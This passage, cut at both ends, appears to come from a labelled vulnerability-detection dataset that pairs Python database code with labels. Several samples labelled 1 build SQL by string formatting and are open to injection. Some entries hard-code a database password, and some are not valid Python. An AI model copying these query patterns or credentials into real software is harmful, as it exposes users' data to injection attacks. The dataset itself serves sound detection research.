'inverter':\n\n                self.add_inverter_data(ts, data)\n\n            elif data_type == 'consumption':\n\n                self.add_consumption_data_row(ts, data['energy'], data['power'])\n\n    def add_inverter_data(self, ts, data):\n\n        inv_serial = data['source']['serial_id']\n        prev_ts, prev_etoday, prev_etotal = self.get_previous_yields(inv_serial)\n\n        status = 'OK'  # TODO: Generate actual status value\n\n        self.add_day_data_row(ts, data, prev_etotal)\n\n        if self.is_timestamps_from_same_day(prev_ts, ts):\n\n            self.update_inverter(inv_serial, ts, status, prev_etoday + data['energy'],  prev_etotal + data['energy'])\n\n        else:   # is new day\n\n            self.update_inverter(inv_serial, ts, status, data['energy'],  prev_etotal + data['energy'])\n            self.add_month_data_row(inv_serial, ts, prev_etoday, prev_etotal)\n\n        self.db.commit()\n\n    def add_day_data_row(self, ts, data, prev_etotal):\n\n        if data['power'] > 0:\n\n            inv_serial = data['source']['serial_id']\n            query = '''\n               INSERT INTO DayData (\n                   TimeStamp,\n                   Serial,\n                   Power,\n                   TotalYield\n               ) VALUES (\n                   %s,\n                   %s,\n                   %s,\n                   %s\n               );\n            ''' % (ts, inv_serial, data['power'],  prev_etotal + data['energy'])\n            self.c.execute(query)\n\n\n    def get_previous_yields(self, inverter_serial):\n        query = '''\n           SELECT TimeStamp, EToday, ETotal\n           FROM Inverters\n           WHERE Serial = '%s'\n        ''' % (inverter_serial)\n        self.c.execute(query)\n        data = self.c.fetchone()\n        return data[0], data[1], data[2]\n\n    def update_inverter(self, inverter_serial, ts, status, etoday, etotal):\n        query = '''\n            UPDATE Inverters\n            SET     \n                TimeStamp='%s', \n                Status='%s', \n                eToday='%s',\n                eTotal='%s'\n            WHERE Serial='%s';\n        ''' % (ts, status, etoday, etotal, inverter_serial)\n        self.c.execute(query)\n\n    def add_month_data_row(self, inverter_serial, ts, etoday, etotal):\n\n        y = datetime.fromtimestamp(ts) - timedelta(days=1)\n        y_ts = int(datetime(y.year, y.month, y.day, 23, tzinfo=pytz.utc).timestamp())\n\n        query = '''\n            INSERT INTO MonthData (\n                TimeStamp,\n                Serial,\n                DayYield,\n                TotalYield                                 \n            ) VALUES (\n                %s,\n                %s,\n                %s,\n                %s\n            );\n        ''' % (y_ts, inverter_serial, etoday, etotal)\n        self.c.execute(query)\n\n    def add_consumption_data_row(self, ts, energy_used, power_used):\n\n        if power_used > 0:\n\n            query = '''\n                INSERT OR IGNORE INTO Consumption (\n                    TimeStamp,\n                    EnergyUsed,\n                    PowerUsed                                \n                ) VALUES (\n                    %s,\n                    %s,\n                    %s\n                );\n            ''' % (ts, 0, 0)\n            self.c.execute(query)\n\n            query = '''\n                UPDATE Consumption SET \n                EnergyUsed = EnergyUsed + %s,\n                PowerUsed = PowerUsed + %s\n                WHERE TimeStamp = %s;\n            ''' % (energy_used, power_used, ts)\n\n            self.c.execute(query)\n\n            self.db.commit()\n\n\n    def is_timestamps_from_same_day(self, ts1, ts2):\n        d1 = datetime.fromtimestamp(ts1)\n        d2 = datetime.fromtimestamp(ts2)\n        return (d1.year == d2.year and d1.month == d2.month and d1.day == d2.day)\n\n    def close(self):\n        self.db.close()\n\nif __name__ == '__main__':\n    #print('nothing to do here')\n\n    import random, time\n    from config import Config\n\n    cfg = Config(config_path='../config.json')\n    db  = Database(cfg)\n\n    db.add_inverters()\n\n    test_ts = 1535932800\n\n    print(test_ts)\n\n    while True:\n\n        test_ts += 300\n        test_date = datetime.fromtimestamp(test_ts)\n\n        if test_date.hour in range(0, 8) or test_date.hour in range(18, 24): continue\n\n        watts = random.randint(50, 400)\n        test_data = [\n            {\n                'energy': int(watts),\n                'power': int(watts / 5*60),\n                'source': {\n                    \"serial_id\": \"1000000001\",\n                    \"name\": \"TEST PLANT\",\n                    \"type\": \"inverter\",\n                    \"prev_etotal\": 62,\n                    \"pulses_per_kwh\": 1000\n                }\n            },\n            {\n                'energy': int(watts),\n                'power': int(watts / 5 * 60),\n                'source': {\n                    \"serial_id\": \"1000000002\",\n                    \"name\": \"TEST CONSUMPTION COUNTER\",\n                    \"type\": \"consumption\"\n                }\n            }\n        ]\n\n        db.add_data(test_ts, test_data)\n        print(test_date.strftime(\"%y-%m-%d %H:%M:%S\"), '\\t', test_ts, '\\t', test_data[0]['energy'], '\\t', test_data[0]['power'])\n\n        time.sleep(0.1)\n\n\n\n\n\n/n/n/n", "label": 1}, {"id": "54fc7b076fda2de74eeb55e6b75b28e09ef231c2", "code": "experimental/python/buford/model/visitor.py/n/nfrom dataclasses import dataclass\n\nimport pytz\n\nfrom config import get_connection\n\n\ndef get_visit_count():\n    connection = get_connection()\n    cursor = connection.cursor()\n    cursor.execute(\n        f\"select count(*) from visitors;\")\n    rows = cursor.fetchall()\n    connection.commit()\n    connection.close()\n    return rows[0][0]\n\n\ndef get_last_n_visitors(n):\n    connection = get_connection()\n    cursor = connection.cursor()\n    cursor.execute(\n        f\"select user_agent, referrer from visitors order by visit_time desc limit 3;\")\n    rows = cursor.fetchall()\n    connection.commit()\n    connection.close()\n    return rows[0][0]\n\n\n@dataclass()\nclass Visitor:\n    ip_address: str\n    user_agent: str\n    referrer: str\n    full_path: str\n    visit_time: pytz\n\n    def on_save(self):\n        connection = get_connection()\n        cursor = connection.cursor()\n        cursor.execute(\n            \"insert into visitors (ip_address, user_agent, referrer, full_path, visit_time) values (%s, %s, %s, %s, %s);\",\n            (str(self.ip_address), str(self.user_agent), str(self.referrer), str(self.full_path), self.visit_time))\n        connection.commit()\n        connection.close()\n        return 0\n/n/n/n", "label": 0}, {"id": "54fc7b076fda2de74eeb55e6b75b28e09ef231c2", "code": "/experimental/python/buford/model/visitor.py/n/nfrom dataclasses import dataclass\n\nimport pytz\n\nfrom config import get_connection\n\n\ndef get_visit_count():\n    connection = get_connection()\n    cursor = connection.cursor()\n    cursor.execute(\n        f\"select count(*) from visitors;\")\n    rows = cursor.fetchall()\n    connection.commit()\n    connection.close()\n    return rows[0][0]\n\n\n@dataclass()\nclass Visitor:\n    ip_address: str\n    user_agent: str\n    referrer: str\n    full_path: str\n    visit_time: pytz\n\n    def on_save(self):\n        connection = get_connection()\n        cursor = connection.cursor()\n        cursor.execute(\n            f\"insert into visitors (ip_address, user_agent, referrer, full_path, visit_time) values ('{self.ip_address}', '{self.user_agent}', '{self.referrer}', '{self.full_path}', '{self.visit_time}');\")\n        connection.commit()\n        connection.close()\n        return 0\n/n/n/n", "label": 1}, {"id": "8480be1977c56f659a3a2b45d2838ced4c13a3a3", "code": "experimental/python/buford/model/applicant.py/n/nfrom dataclasses import dataclass\n\nimport psycopg2\nimport pytz\n\nfrom config import get_connection\n\n\n@dataclass\nclass Applicant:\n    email: str\n    registration_time: pytz\n\n    def on_save(self) -> int:\n        connection = get_connection()\n        cursor = connection.cursor()\n        try:\n            cursor.execute(\n                \"\"\"\n                insert into applicants (email, registration_time) values (%s, %s);\", (self.email, self.registration_time))\n            connection.commit()\n        except psycopg2.IntegrityError:\n            print(\"this email already exists\")\n            return 1\n        connection.close()\n        return 0\n/n/n/n", "label": 0}, {"id": "8480be1977c56f659a3a2b45d2838ced4c13a3a3", "code": "/experimental/python/buford/model/applicant.py/n/nfrom dataclasses import dataclass\n\nimport psycopg2\nimport pytz\n\nfrom config import get_connection\n\n\n@dataclass\nclass Applicant:\n    email: str\n    registration_time: pytz\n\n    def on_save(self) -> int:\n        connection = get_connection()\n        cursor = connection.cursor()\n        try:\n            cursor.execute(\n                f\"insert into applicants (email, registration_time) values ('{self.email}', '{self.registration_time}');\")\n            connection.commit()\n        except psycopg2.IntegrityError:\n            print(\"this email already exists\")\n            return 1\n        connection.close()\n        return 0\n/n/n/n", "label": 1}, {"id": "c603201e401e414097358f32a23ca5521aa39dec", "code": "brewdiedb.py/n/n# Copyright 2019, Lukas J\u00e4ger \n#\n# This file is part of Brewdie.\n#\n# Brewdie is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n# \n# Brewdie is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Brewdie.  If not, see <http://www.gnu.org/licenses/>. \n\nimport sqlite3\nimport sys\nfrom recipe import *\n\nclass BrewdieDB:\n    def __init__(self):\n        try:\n            # Establishing a connection\n            connection = sqlite3.connect('brewdie.db')\n            cursor = connection.cursor()\n\n            # Querying for existing tables\n            table_names = []\n            for row in cursor.execute('SELECT name FROM sqlite_master WHERE type=\\'table\\''):\n                table_names.append(row[0])\n\n            # Creating tables if they don't exist\n            if not 'Recipes' in table_names:\n                cursor.execute('CREATE TABLE Recipes (name TEXT PRIMARY KEY, type TEXT, boiling_minutes INTEGER)')\n            if not 'Malts' in table_names:\n                cursor.execute('CREATE TABLE Malts (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, gramms REAL, recipe_name TEXT)')\n            if not 'Rests' in table_names:\n                cursor.execute('CREATE TABLE Rests (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, degrees REAL, minutes INTEGER, position INTEGER, recipe_name TEXT)')\n            if not 'HopDosages' in table_names:\n                cursor.execute('CREATE TABLE HopDosages (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, minutes INTEGER, gramms REAL, recipe_name TEXT)')\n\n            connection.commit()\n        \n        except sqlite3.Error as e:\n            if connection:\n                connection.rollback()\n                sys.exit(1)\n\n        finally:\n            if connection:\n                connection.close()\n\n    def store_recipe(self, recipe):\n        try:\n            # Establishing a connection\n            connection = sqlite3.connect('brewdie.db')\n            cursor = connection.cursor()\n        \n            # Querying, whether or not the recipe is already in the database\n            recipe_names = []\n            for row in cursor.execute('SELECT name FROM Recipes'):\n                recipe_names.append(row[0])\n            if recipe.name in recipe_names:\n                print(\"Recipe is already stored in the database\")\n            else:\n                # It is not, so we can insert it\n                cursor.execute('INSERT INTO Recipes VALUES(?, ?, ?)', (recipe.name, recipe.style, recipe.boiling_minutes))\n                for (malt_name, malt_gramms) in recipe.malts.items():\n                    cursor.execute('INSERT INTO Malts(name, gramms, recipe_name) VALUES(?, ?, ?)', (malt_name, malt_gramms, recipe.name))\n\n                index = 0\n                for rest in recipe.rests:\n                    cursor.execute('INSERT INTO Rests(name, degrees, minutes, position, recipe_name) VALUES(?, ?, ?, ?, ?)', (rest.name, rest.degrees, rest.minutes, index, recipe.name))\n                    index = index + 1\n\n                for hop_dosage in recipe.hop_dosages:\n                    cursor.execute('INSERT INTO HopDosages(name, minutes, gramms, recipe_name) VALUES(?, ?, ?, ?)', (hop_dosage.name, hop_dosage.minutes, hop_dosage.gramms, recipe.name))\n            connection.commit()\n        except sqlite3.Error as e:\n            print(\"Something went wrong\")\n            print(e)\n            if connection:\n                connection.rollback()\n            return\n\n        finally:\n            if connection:\n                connection.close()\n\n    def load_recipes(self):\n        recipes = []\n        try:\n            # Establishing a connection\n            connection = sqlite3.connect('brewdie.db')\n            cursor = connection.cursor()\n        \n            # Getting all the recipes\n            for row in cursor.execute('SELECT * FROM Recipes'):\n                # Converting a recipe database row into a python object\n                recipe = Recipe(row[0], row[1], row[2])\n                recipe_name = (recipe.name, )\n\n                # Adding the malts\n                for malt_row in cursor.execute('SELECT * FROM Malts WHERE recipe_name=?', recipe_name):\n                    recipe.malts[malt_row[1]] = malt_row[2]\n\n                # Adding the rests\n                for rest_row in cursor.execute('SELECT * FROM Rests WHERE recipe_name=? ORDER BY position ASC', recipe_name):\n                    recipe.rests.append(Rest(rest_row[1], rest_row[2], rest_row[3]))\n\n                # Adding the hop dosages\n                for hop_dosage_row in cursor.execute('SELECT * FROM HopDosages WHERE recipe_name=?', recipe_name):\n                    recipe.hop_dosages.append(HopDosage(hop_dosage_row[1], hop_dosage_row[3], hop_dosage_row[2]))\n\n                # Adding the recipe to the list of recipes\n                recipes.append(recipe)\n\n        except sqlite3.Error as e:\n            print(\"Something went wrong\")\n            print(e)\n            if connection:\n                connection.rollback()\n            return\n\n        finally:\n            if connection:\n                connection.close()\n        return recipes\n/n/n/n", "label": 0}, {"id": "c603201e401e414097358f32a23ca5521aa39dec", "code": "/brewdiedb.py/n/n# Copyright 2019, Lukas J\u00e4ger \n#\n# This file is part of Brewdie.\n#\n# Brewdie is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n# \n# Brewdie is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Brewdie.  If not, see <http://www.gnu.org/licenses/>. \n\nimport sqlite3\nimport sys\nfrom recipe import *\n\nclass BrewdieDB:\n    def __init__(self):\n        try:\n            # Establishing a connection\n            connection = sqlite3.connect('brewdie.db')\n            cursor = connection.cursor()\n\n            # Querying for existing tables\n            table_names = []\n            for row in cursor.execute('SELECT name FROM sqlite_master WHERE type=\\'table\\''):\n                table_names.append(row[0])\n\n            # Creating tables if they don't exist\n            if not 'Recipes' in table_names:\n                cursor.execute('CREATE TABLE Recipes (name TEXT PRIMARY KEY, type TEXT, boiling_minutes INTEGER)')\n            if not 'Malts' in table_names:\n                cursor.execute('CREATE TABLE Malts (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, gramms REAL, recipe_name TEXT)')\n            if not 'Rests' in table_names:\n                cursor.execute('CREATE TABLE Rests (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, degrees REAL, minutes INTEGER, position INTEGER, recipe_name TEXT)')\n            if not 'HopDosages' in table_names:\n                cursor.execute('CREATE TABLE HopDosages (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, minutes INTEGER, gramms REAL, recipe_name TEXT)')\n\n            connection.commit()\n        \n        except sqlite3.Error as e:\n            if connection:\n                connection.rollback()\n                sys.exit(1)\n\n        finally:\n            if connection:\n                connection.close()\n\n    def store_recipe(self, recipe):\n        try:\n            # Establishing a connection\n            connection = sqlite3.connect('brewdie.db')\n            cursor = connection.cursor()\n        \n            # Querying, whether or not the recipe is already in the database\n            recipe_names = []\n            for row in cursor.execute('SELECT name FROM Recipes'):\n                recipe_names.append(row[0])\n            if recipe.name in recipe_names:\n                print(\"Recipe is already stored in the database\")\n            else:\n                # It is not, so we can insert it\n                cursor.execute('INSERT INTO Recipes VALUES(?, ?, ?)', (recipe.name, recipe.style, recipe.boiling_minutes))\n                for (malt_name, malt_gramms) in recipe.malts.items():\n                    cursor.execute('INSERT INTO Malts(name, gramms, recipe_name) VALUES(?, ?, ?)', (malt_name, malt_gramms, recipe.name))\n\n                index = 0\n                for rest in recipe.rests:\n                    cursor.execute('INSERT INTO Rests(name, degrees, minutes, position, recipe_name) VALUES(?, ?, ?, ?, ?)', (rest.name, rest.degrees, rest.minutes, index, recipe.name))\n                    index = index + 1\n\n                for hop_dosage in recipe.hop_dosages:\n                    cursor.execute('INSERT INTO HopDosages(name, minutes, gramms, recipe_name) VALUES(?, ?, ?, ?)', (hop_dosage.name, hop_dosage.minutes, hop_dosage.gramms, recipe.name))\n            connection.commit()\n        except sqlite3.Error as e:\n            print(\"Something went wrong\")\n            print(e)\n            if connection:\n                connection.rollback()\n            return\n\n        finally:\n            if connection:\n                connection.close()\n\n    def load_recipes(self):\n        recipes = []\n        try:\n            # Establishing a connection\n            connection = sqlite3.connect('brewdie.db')\n            cursor = connection.cursor()\n        \n            # Getting all the recipes\n            for row in cursor.execute('SELECT * FROM Recipes'):\n                # Converting a recipe database row into a python object\n                recipe = Recipe(row[0], row[1], row[2])\n\n                # Adding the malts\n                for malt_row in cursor.execute('SELECT * FROM Malts WHERE recipe_name=\\'%s\\'' % recipe.name):\n                    recipe.malts[malt_row[1]] = malt_row[2]\n\n                # Adding the rests\n                for rest_row in cursor.execute('SELECT * FROM Rests WHERE recipe_name=\\'%s\\' ORDER BY position ASC' % recipe.name):\n                    recipe.rests.append(Rest(rest_row[1], rest_row[2], rest_row[3]))\n\n                # Adding the hop dosages\n                for hop_dosage_row in cursor.execute('SELECT * FROM HopDosages WHERE recipe_name=\\'%s\\'' % recipe.name):\n                    recipe.hop_dosages.append(HopDosage(hop_dosage_row[1], hop_dosage_row[3], hop_dosage_row[2]))\n\n                # Adding the recipe to the list of recipes\n                recipes.append(recipe)\n\n        except sqlite3.Error as e:\n            print(\"Something went wrong\")\n            print(e)\n            if connection:\n                connection.rollback()\n            return\n\n        finally:\n            if connection:\n                connection.close()\n        return recipes\n/n/n/n", "label": 1}, {"id": "bb6565986f52a8bb29c11d8aade74c42bbe3a4ca", "code": "process_signup_validate.py/n/n#!/usr/bin/env python3\r\nimport re\r\nimport cgi\r\nimport cgitb\r\nfrom http import cookies\r\nimport urllib.parse\r\nimport mysql.connector\r\nfrom mysql.connector import errorcode\r\nimport hashlib\r\n\r\ncgitb.enable() #provides additional security by not revealing innerworkings of code to the outside\r\n\r\nform = cgi.FieldStorage() #instantiates the form data\r\n\r\nname = form.getvalue('name')\r\nusername = form.getvalue('username')\r\npassword = form.getvalue('password')\r\npassword2 = form.getvalue('password2')\r\n\r\n\r\nuserExists = false\r\n\r\nif password == password2 && len(name)>0 && len(username)>0:\r\n    #set cookies\r\n    #set expiration time\r\n    expires = 60*60;\r\n\r\n    cookie = cookies.SimpleCookie()\r\n    cookie[\"sessionID\"] = urllib.parse.quote(Math.random())\r\n    cookie[\"username\"] = urllib.parse.quote(username)\r\n    cookie[\"username\"]['expires'] = expires\r\n\r\n    #connect to mysql database\r\n    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')\r\n    cursor = conn.cursor()\r\n    cursor.execute(\"SELECT Username FROM Users\")\r\n    for row in cursor:\r\n        if row == username:\r\n            userExists = true\r\n            break\r\n    if userExists:\r\n        #redirects to signup because they didn't do so correctly.\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are failed to signup correctly.\");\r\n                    alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\n    else:\r\n\t#hash the password before adding to the database\r\n\thashedPassword = hashlib.md5(password.encode())\r\n\t#Escape any < or > in the username or name\r\n        username = re.escape(username)\r\n\tname = re.escape(name)\t\r\n        #add the user to the database\r\n        cursor.execute(\"INSERT INTO Users VALUES (\"+username+\",\"+ name+\",\"+ hashedPassword\")\")\r\n\r\n        #redirects to the message board\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are now signed in as \"+username);\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='messageboard.py'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\nelse:\r\n    #redirects to signup because they didn't do so correctly.\r\n    print(\"Content-Type: text/html\")\r\n    print()\r\n    print('''\\\r\n    <html>\r\n        <head>\r\n            <script>\r\n                alert(\"You are failed to signup correctly.\");\r\n                alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n            </script>\r\n            <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n        </head>\r\n    </html>\r\n    ''')\r\n\r\n#necessary for the database to not get messed up\r\ncursor.close()\r\nconn.commit()\r\nconn.close()\r\n/n/n/n", "label": 0}, {"id": "bb6565986f52a8bb29c11d8aade74c42bbe3a4ca", "code": "/process_signup_validate.py/n/n#!/usr/bin/env python3\r\n\r\nimport cgi\r\nimport cgitb\r\nfrom http import cookies\r\nimport urllib.parse\r\nimport mysql.connector\r\nfrom mysql.connector import errorcode\r\nimport hashlib\r\n\r\ncgitb.enable() #provides additional security by not revealing innerworkings of code to the outside\r\n\r\nform = cgi.FieldStorage() #instantiates the form data\r\n\r\nname = form.getvalue('name')\r\nusername = form.getvalue('username')\r\npassword = form.getvalue('password')\r\npassword2 = form.getvalue('password2')\r\n\r\n\r\nuserExists = false\r\n\r\nif password == password2 && len(name)>0 && len(username)>0:\r\n    #set cookies\r\n    #set expiration time\r\n    expires = 60*60;\r\n\r\n    cookie = cookies.SimpleCookie()\r\n    cookie[\"sessionID\"] = urllib.parse.quote(Math.random())\r\n    cookie[\"username\"] = urllib.parse.quote(username)\r\n    cookie[\"username\"]['expires'] = expires\r\n\r\n    #connect to mysql database\r\n    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')\r\n    cursor = conn.cursor()\r\n    cursor.execute(\"SELECT Username FROM Users\")\r\n    for row in cursor:\r\n        if row == username:\r\n            userExists = true\r\n            break\r\n    if userExists:\r\n        #redirects to signup because they didn't do so correctly.\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are failed to signup correctly.\");\r\n                    alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\n    else:\r\n\t#hash the password before adding to the database\r\n\thashedPassword = hashlib.md5(password.encode())\r\n        #add the user to the database\r\n        cursor.execute(\"INSERT INTO Users VALUES (\"+username+\",\"+ name+\",\"+ hashedPassword\")\")\r\n\r\n        #redirects to the message board\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are now signed in as \"+username);\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='messageboard.py'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\nelse:\r\n    #redirects to signup because they didn't do so correctly.\r\n    print(\"Content-Type: text/html\")\r\n    print()\r\n    print('''\\\r\n    <html>\r\n        <head>\r\n            <script>\r\n                alert(\"You are failed to signup correctly.\");\r\n                alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n            </script>\r\n            <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n        </head>\r\n    </html>\r\n    ''')\r\n\r\n#necessary for the database to not get messed up\r\ncursor.close()\r\nconn.commit()\r\nconn.close()\r\n/n/n/n", "label": 1}, {"id": "59df39c8285aa4d6b7473163c3884e84d53604ce", "code": "process_signup_validate.py/n/n#!/usr/bin/env python3\r\nimport re\r\nimport cgi\r\nimport cgitb\r\nfrom http import cookies\r\nimport urllib.parse\r\nimport mysql.connector\r\nfrom mysql.connector import errorcode\r\nimport hashlib\r\n\r\ncgitb.enable() #provides additional security by not revealing innerworkings of code to the outside\r\n\r\nform = cgi.FieldStorage() #instantiates the form data\r\n\r\nname = form.getvalue('name')\r\nusername = form.getvalue('username')\r\npassword = form.getvalue('password')\r\npassword2 = form.getvalue('password2')\r\n\r\n\r\nuserExists = false\r\n\r\nif password == password2 && len(name)>0 && len(username)>0:\r\n    #set cookies\r\n    #set expiration time\r\n    expires = 60*60;\r\n\r\n    cookie = cookies.SimpleCookie()\r\n    cookie[\"sessionID\"] = urllib.parse.quote(Math.random())\r\n    cookie[\"username\"] = urllib.parse.quote(username)\r\n    cookie[\"username\"]['expires'] = expires\r\n\r\n    #connect to mysql database\r\n    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')\r\n    cursor = conn.cursor()\r\n    cursor.execute(\"SELECT Username FROM Users\")\r\n    for row in cursor:\r\n        if row == username:\r\n            userExists = true\r\n            break\r\n    if userExists:\r\n        #redirects to signup because they didn't do so correctly.\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are failed to signup correctly.\");\r\n                    alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\n    else:\r\n\t#hash the password before adding to the database\r\n\thashedPassword = hashlib.md5(password.encode())\r\n\t#Escape any < or > in the username or name\r\n        username = re.escape(username)\r\n\tname = re.escape(name)\t\r\n        #add the user to the database\r\n\tquery = \"INSERT INTO Users(username, name, password) values (%s, %s, %s)\"\r\n\tcursor.execute(query,(username, name, hashedPassword)       \r\n\r\n\r\n        #redirects to the message board\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are now signed in as \"+username);\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='messageboard.py'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\nelse:\r\n    #redirects to signup because they didn't do so correctly.\r\n    print(\"Content-Type: text/html\")\r\n    print()\r\n    print('''\\\r\n    <html>\r\n        <head>\r\n            <script>\r\n                alert(\"You are failed to signup correctly.\");\r\n                alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n            </script>\r\n            <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n        </head>\r\n    </html>\r\n    ''')\r\n\r\n#necessary for the database to not get messed up\r\ncursor.close()\r\nconn.commit()\r\nconn.close()\r\n/n/n/n", "label": 0}, {"id": "59df39c8285aa4d6b7473163c3884e84d53604ce", "code": "/process_signup_validate.py/n/n#!/usr/bin/env python3\r\nimport re\r\nimport cgi\r\nimport cgitb\r\nfrom http import cookies\r\nimport urllib.parse\r\nimport mysql.connector\r\nfrom mysql.connector import errorcode\r\nimport hashlib\r\n\r\ncgitb.enable() #provides additional security by not revealing innerworkings of code to the outside\r\n\r\nform = cgi.FieldStorage() #instantiates the form data\r\n\r\nname = form.getvalue('name')\r\nusername = form.getvalue('username')\r\npassword = form.getvalue('password')\r\npassword2 = form.getvalue('password2')\r\n\r\n\r\nuserExists = false\r\n\r\nif password == password2 && len(name)>0 && len(username)>0:\r\n    #set cookies\r\n    #set expiration time\r\n    expires = 60*60;\r\n\r\n    cookie = cookies.SimpleCookie()\r\n    cookie[\"sessionID\"] = urllib.parse.quote(Math.random())\r\n    cookie[\"username\"] = urllib.parse.quote(username)\r\n    cookie[\"username\"]['expires'] = expires\r\n\r\n    #connect to mysql database\r\n    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')\r\n    cursor = conn.cursor()\r\n    cursor.execute(\"SELECT Username FROM Users\")\r\n    for row in cursor:\r\n        if row == username:\r\n            userExists = true\r\n            break\r\n    if userExists:\r\n        #redirects to signup because they didn't do so correctly.\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are failed to signup correctly.\");\r\n                    alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\n    else:\r\n\t#hash the password before adding to the database\r\n\thashedPassword = hashlib.md5(password.encode())\r\n\t#Escape any < or > in the username or name\r\n        username = re.escape(username)\r\n\tname = re.escape(name)\t\r\n        #add the user to the database\r\n        cursor.execute(\"INSERT INTO Users VALUES (\"+username+\",\"+ name+\",\"+ hashedPassword\")\")\r\n\r\n        #redirects to the message board\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are now signed in as \"+username);\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='messageboard.py'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\nelse:\r\n    #redirects to signup because they didn't do so correctly.\r\n    print(\"Content-Type: text/html\")\r\n    print()\r\n    print('''\\\r\n    <html>\r\n        <head>\r\n            <script>\r\n                alert(\"You are failed to signup correctly.\");\r\n                alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n            </script>\r\n            <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n        </head>\r\n    </html>\r\n    ''')\r\n\r\n#necessary for the database to not get messed up\r\ncursor.close()\r\nconn.commit()\r\nconn.close()\r\n/n/n/n", "label": 1}, {"id": "e96fbd2bce5d10612be93170b1bf953f27dd77b6", "code": "application.py/n/nfrom flask import Flask, render_template, redirect, url_for, request, session, flash, abort, send_from_directory\nfrom werkzeug.utils import secure_filename\nfrom db import db_init, dao\nfrom time import sleep\nimport random, os, uuid\n\napp = Flask(__name__)\napp.secret_key = 'Gusnq4H7S2O0A-v=2FmaueE>obi/An8yP(DFdk%m1a5ob'\ndb_init.database_init()\napp.config['UPLOAD_FOLDER'] = 'upload/'\nif not os.path.isdir(os.path.join(app.config['UPLOAD_FOLDER'])):\n    os.mkdir(os.path.join(app.config['UPLOAD_FOLDER']))\n\n@app.route('/index')\ndef index():\n    verify_session_id()\n    return render_template('index.html', username=session.get('usr'), notesList=session.get('nl'))\n\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login(error = None):\n    if request.method == 'GET':\n        return render_template('login.html', error=error)\n    else:\n        usr = request.form.get('username')\n        pwd = request.form.get('password')\n\n        if authenticated_correctly(usr, pwd):\n            return redirect(url_for('index'))\n        else:\n            return render_template('login.html', error='Nieprawid\u0142owa nazwa u\u017cytkownika lub has\u0142o')\n\n\n@app.route('/logout', methods=['GET'])\ndef logout():\n    dao.logout(session.get('sid'))\n    session.clear()\n    return 